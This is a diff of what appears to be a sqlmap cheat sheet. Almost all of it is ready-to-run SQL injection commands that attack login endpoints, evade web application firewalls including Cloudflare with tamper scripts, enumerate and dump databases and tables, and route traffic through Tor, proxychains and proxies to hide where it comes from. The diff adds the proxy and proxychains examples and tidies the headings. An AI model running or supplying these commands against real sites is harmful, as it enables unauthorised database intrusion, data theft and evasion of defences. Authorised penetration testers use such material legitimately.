@@ -18,19 +18,24 @@ $ sqlmap -u "sitetarget.com/admin/login_action" method="POST" --data="uname=admi
 $ sqlmap -u "sitetarget.com/admin/login_action" method="POST" --data="uname=admin*&pass=admin&captcha=123456" --cookie="input cookie" --headers="input field header" --dbs --technique=T
 
 Example Bypass WAF SQLMap New Version Update :
-
 $ sqlmap -u "Target.com" --random-agent -v 3 --tamper="between,randomcase,space2comment" --dbs
 $ sqlmap -u "Target.com" --random-agent -v 3 --dbs
 $ sqlmap -u "Target.com" --random-agent -v 3 --tamper="between,randomcase,space2comment" --level=5 --risk=3 --dbs
 $ sqlmap -u "http://sitetarget.com/login" --data="userid=admin&passwd=admin" --method POST --random-agent -v 3 --tamper="between,randomcase,space2comment" --level=5 --risk=3 --dbs
 $ sqlmap -r poc.txt --threads=10 --random-agent --level=5 --risk=3 --tamper=space2comment,between --dbs
 
-example dump DB use poc http post request :
+Example dump DB use poc http post request :
 $ sqlmap -r poc.txt --threads=10 --random-agent --level=5 --risk=3 --tamper=space2comment,between --dbms=MySQL -D database_target --tables
 
-example WAF Header :
+Example WAF Header :
 $ sqlmap -u https://target.com/vote/check_vote.php --headers="X-Forwarded-For:1*" -p X-Forwarded-For --level=5 --risk=3 --tamper="space2comment,between,randomcase" --technique="BEUST" --no-cast --random-agent --drop-set-cookie --dbms=mysql --dbs
 $ sqlmap -u https://target.com/vote/check_vote.php --headers="X-Forwarded-For:1*" -p X-Forwarded-For --level=5 --risk=3 --tamper="space2comment,between,randomcase" --technique="BEUST" --no-cast --random-agent --dbs
 
-example WAF CloudFlare use proxy Tor default :
+Example WAF CloudFlare use proxy Tor default :
 $ sqlmap -u "https://target.com" --data="id=63665%20RLIKE%20-bla-blablabla" --time-sec=20 --random-agent --level=5 --risk=3 --tamper="space2comment,between,randomcase,charencode" --technique=BEUST --privileges --no-cast --tor --tor-port=9050 --tor-type=socks5 --check-tor --banner --union-char=1 --dbms=MySQL --dbs
+
+Example use proxy :
+$ sqlmap -u "https://example.com/login?id=1" --tamper=space2comment,between --proxy="http://127.0.0.1:8080"
+
+Example use SQLMap + ProxyChains :
+$ proxychains sqlmap -u 'https://example.com/' --dbs --batch -p id --random-agent --tamper=between,space2comment --dbms mysql --tech=B --no-cast  --flush-session --threads 10
